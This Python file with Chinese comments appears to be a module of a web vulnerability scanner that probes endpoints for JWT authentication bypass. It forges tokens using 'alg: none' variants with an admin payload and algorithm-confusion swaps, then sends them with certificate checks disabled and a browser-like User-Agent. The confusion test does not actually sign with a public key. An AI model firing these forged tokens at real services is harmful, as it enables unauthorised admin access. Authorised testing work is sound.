import base64
import json
import hmac
import hashlib
from typing import Dict, List, Optional, Tuple
import requests


class JWTAuthBypassDetector:
    """JWT鉴权绕过检测器"""
    
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.request_cache = {}  # 缓存请求结果
        self.session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10))
        self.session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10))
        
    def decode_jwt(self, token: str) -> Dict:
        """解码JWT"""
        parts = token.split('.')
        result = {
            'header': {},
            'payload': {},
            'signature': '',
            'format_valid': len(parts) == 3
        }
        
        if len(parts) == 3:
            try:
                # 解码header
                header_b64 = parts[0]
                header_b64 += '=' * (-len(header_b64) % 4)
                result['header'] = json.loads(base64.urlsafe_b64decode(header_b64).decode())
                
                # 解码payload
                payload_b64 = parts[1]
                payload_b64 += '=' * (-len(payload_b64) % 4)
                result['payload'] = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
                
                result['signature'] = parts[2]
            except:
                pass
        
        return result
    
    def encode_jwt(self, header: Dict, payload: Dict, signature: str = '') -> str:
        """编码JWT"""
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        if signature:
            return f"{header_b64}.{payload_b64}.{signature}"
        else:
            return f"{header_b64}.{payload_b64}."
    
    def test_none_algorithm(self, 
                           endpoint: Dict, 
                           original_token: str = None) -> List[Dict]:
        """
        测试空算法漏洞 (alg: none)
        参考CVE-2026-23993的分析
        """
        findings = []
        
        # 如果没有原始token，构造一个
        if not original_token:
            # 构造测试payload
            test_payload = {
                'sub': 'admin',
                'role': 'admin',
                'iat': 1516239022
            }
        else:
            decoded = self.decode_jwt(original_token)
            test_payload = decoded.get('payload', {})
        
        # 测试各种none变体
        none_variants = ['none', 'None', 'NONE', '', 'null', 'undefined']
        
        for variant in none_variants:
            # 构造恶意token
            malicious_header = {
                'alg': variant,
                'typ': 'JWT'
            }
            
            malicious_token = self.encode_jwt(malicious_header, test_payload)
            
            # 发送请求
            response = self._send_request(endpoint, malicious_token)
            
            # 判断是否绕过
            if self._is_bypass_successful(response):
                findings.append({
                    'vulnerability': 'JWT_None_Algorithm',
                    'alg_used': variant,
                    'description': f'JWT接受空算法: {variant}',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint['url'],
                    'status_code': response.status_code,
                    'confidence': 0.95
                })
                break  # 找到一个即可
        
        return findings
    
    def test_algorithm_confusion(self, 
                                 endpoint: Dict, 
                                 original_token: str) -> List[Dict]:
        """
        测试算法混淆漏洞 (HS256 vs RS256)
        参考Hono JWT中间件漏洞
        """
        findings = []
        
        decoded = self.decode_jwt(original_token)
        if not decoded['header']:
            return findings
        
        original_alg = decoded['header'].get('alg', '')
        
        # 测试场景1: HS256 -> RS256 (公钥可用时)
        if original_alg == 'RS256':
            # 尝试用HS256验证（将公钥作为密钥）
            malicious_token = self._craft_confusion_token(decoded, 'HS256')
            
            response = self._send_request(endpoint, malicious_token)
            if self._is_bypass_successful(response):
                findings.append({
                    'vulnerability': 'JWT_Algorithm_Confusion',
                    'original_alg': original_alg,
                    'tested_alg': 'HS256',
                    'description': 'JWT算法混淆漏洞 (RS256→HS256)',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint['url'],
                    'status_code': response.status_code,
                    'confidence': 0.9
                })
        
        # 测试场景2: 算法切换后签名不变
        alg_variants = ['HS256', 'HS384', 'HS512']
        for alg in alg_variants:
            if alg != original_alg:
                malicious_token = self._craft_confusion_token(decoded, alg)
                
                response = self._send_request(endpoint, malicious_token)
                if self._is_bypass_successful(response):
                    findings.append({
                        'vulnerability': 'JWT_Algorithm_Switch',
                        'original_alg': original_alg,
                        'tested_alg': alg,
                        'description': f'JWT接受算法切换: {original_alg}→{alg}',
                        'severity': 'HIGH',
                        'endpoint': endpoint['url'],
                        'status_code': response.status_code,
                        'confidence': 0.8
                    })
        
        return findings
    
    def _craft_confusion_token(self, decoded: Dict, target_alg: str) -> str:
        """构造算法混淆的JWT"""
        # 修改header中的alg
        malicious_header = decoded['header'].copy()
        malicious_header['alg'] = target_alg
        
        # 保留原有payload
        payload = decoded['payload']
        
        # 构造新token（签名保持不变）
        header_b64 = base64.urlsafe_b64encode(json.dumps(malicious_header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{decoded['signature']}"
    
    def _send_request(self, endpoint: Dict, token: str) -> requests.Response:
        """发送带JWT的请求"""
        url = endpoint['url']
        method = endpoint.get('method', 'GET')
        
        # 缓存键
        cache_key = f"{method}:{url}:{token}"
        
        # 检查缓存
        if cache_key in self.request_cache:
            return self.request_cache[cache_key]
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Authorization': f'Bearer {token}'
        }
        
        try:
            if method == 'GET':
                response = self.session.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            else:
                response = self.session.get(url, headers=headers, timeout=5, verify=False)
            
            # 缓存结果
            self.request_cache[cache_key] = response
            return response
        except Exception as e:
            return None
    
    def _is_bypass_successful(self, response: requests.Response) -> bool:
        """判断是否绕过成功"""
        if not response:
            return False
        
        # 200状态码通常表示成功
        if response.status_code == 200:
            return True
        
        # 302重定向到成功页面也可能表示成功
        elif response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'success' in location or 'dashboard' in location or 'admin' in location:
                return True
        
        return False
    
    def extract_jwt_from_response(self, response: requests.Response) -> Optional[str]:
        """从响应中提取JWT"""
        if not response:
            return None
        
        # 从响应头中提取
        auth_header = response.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            return auth_header[7:]
        
        # 从响应体中提取
        try:
            content = response.text
            # 匹配JWT格式
            import re
            jwt_pattern = r'[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            matches = re.findall(jwt_pattern, content)
            for match in matches:
                if len(match.split('.')) == 3:
                    return match
        except:
            pass
        
        return None
    
    def detect_jwt_bypass(self, 
                         endpoint: Dict, 
                         auth_token: str = None) -> List[Dict]:
        """
        检测JWT鉴权绕过漏洞
        """
        findings = []
        
        # 测试空算法漏洞
        none_findings = self.test_none_algorithm(endpoint, auth_token)
        findings.extend(none_findings)
        
        # 如果有原始token，测试算法混淆
        if auth_token:
            confusion_findings = self.test_algorithm_confusion(endpoint, auth_token)
            findings.extend(confusion_findings)
        
        return findings
